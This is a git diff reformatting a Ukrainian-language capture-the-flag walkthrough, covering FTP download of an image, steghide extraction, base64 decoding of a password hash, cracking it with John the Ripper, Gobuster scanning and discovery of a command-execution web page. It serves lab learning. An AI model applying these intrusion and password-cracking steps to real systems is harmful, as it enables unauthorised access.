@@ -17,27 +17,27 @@
    └─$ ftp 10.114.134.73
    ```
 
-      Звідти було завантажено зображення `gum_room.jpg`.
+   Звідти було завантажено зображення `gum_room.jpg`.
   
    ![png](./img/ftp.png)
 
 
-      Перевіряємо зображення на наявність прихованих файлів за допомогою `steghide`:
+  Перевіряємо зображення на наявність прихованих файлів за допомогою `steghide`:
    ```bash
    └─$ steghide extract -sf gum_room.jpg 
    Enter passphrase: 
    wrote extracted data to "b64.txt".
    ```
-      Пароль виявився порожнім (просто натиснуто Enter).
+   Пароль виявився порожнім (просто натиснуто Enter).
 
-      Отриманий файл `b64.txt` містив рядок у форматі `Base64`. Після декодування ми отримали хеш пароля користувача `charlie`:
+   Отриманий файл `b64.txt` містив рядок у форматі `Base64`. Після декодування ми отримали хеш пароля користувача `charlie`:
    ```bash
    ─$ cat b64.txt | base64 -d
    ...
    charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
    ```
 
-      Зберігаємо хеш у файл та брутфорсимо його через `John the Ripper` зі словником `rockyou.txt`:
+   Зберігаємо хеш у файл та брутфорсимо його через `John the Ripper` зі словником `rockyou.txt`:
    ```bash
    └─$ echo '$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/' > hash.txt
    └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
@@ -61,14 +61,14 @@
    ...
    ```
 
-      Запускаємо сканування директорій за допомогою `Gobuster`:
+   Запускаємо сканування директорій за допомогою `Gobuster`:
    ```bash
    └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://10.114.134.73 -k -t 50 -x html,php,txt
    ```
 
    ![gobuster](./img/gobuster.png)
 
-      Знаходимо сторінку `home.php`, яка містить веб-інтерфейс (командний шелл) для виконання системних команд.
+   Знаходимо сторінку `home.php`, яка містить веб-інтерфейс (командний шелл) для виконання системних команд.
 
    ![home.php](./img/home_php.png)
 
